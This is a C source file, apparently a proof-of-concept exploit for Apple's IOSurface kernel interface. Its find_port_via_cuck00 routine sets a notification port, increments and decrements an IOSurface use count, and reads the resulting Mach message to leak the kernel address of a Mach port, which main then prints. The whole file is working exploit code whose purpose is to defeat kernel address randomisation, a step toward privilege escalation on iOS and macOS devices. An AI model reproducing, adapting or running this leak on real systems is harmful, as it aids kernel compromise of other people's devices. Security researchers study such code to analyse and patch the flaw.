#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <sched.h> 

#include "iosurface.h"
#include "iokit.h"
#include "helper.h"

// Kernel Page Size.
extern mach_vm_size_t pagesize;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

const uint32_t IOSURFACE_INCREMENT_USE_COUNT = 14;
const uint32_t IOSURFACE_DECREMENT_USE_COUNT = 15;
const uint32_t IOSURFACE_SET_NOTIFY          = 17;

uint64_t find_port_via_cuck00(mach_port_t port) {
    uint64_t A = 0x4141414141414141;
    uint64_t refs[8] = {A,A,A,A,A,A,A,A};
    uint64_t in[3] = {0,0,0};
    uint64_t id = IOSurface_id;

    if (IOConnectCallAsyncStructMethod(IOSurfaceRootUserClient, IOSURFACE_SET_NOTIFY, port, refs, 8, in, sizeof(in), NULL, NULL)) return 0;
    if (IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSURFACE_INCREMENT_USE_COUNT, &id, 1, NULL, NULL)) return 0;
    if (IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSURFACE_DECREMENT_USE_COUNT, &id, 1, NULL, NULL)) return 0;
    
    struct {
        mach_msg_header_t head;
        struct {
            mach_msg_size_t size;
            natural_t type;
            uintptr_t ref[8];
        } notify;
        struct {
            kern_return_t ret;
            uintptr_t ref[8];
        } content;
        mach_msg_max_trailer_t trailer;
    } msg = {};
    
    if (mach_msg(&msg.head, MACH_RCV_MSG, 0, sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)) return 0;
    return msg.notify.ref[0] & ~3;
}


int main(int argc, char *argv[], char *envp[]) {
    IOSurface_init();

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t  ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    INFO("port: %x, %s\n", port, mach_error_string(ret));

    uint64_t leaked_port_addr = find_port_via_cuck00(port);
    INFO("leaked_port_addr: 0x%llx\n", leaked_port_addr);

    mach_port_destroy(mach_task_self(), port);    

    IOSurface_deinit();

    return 0;
}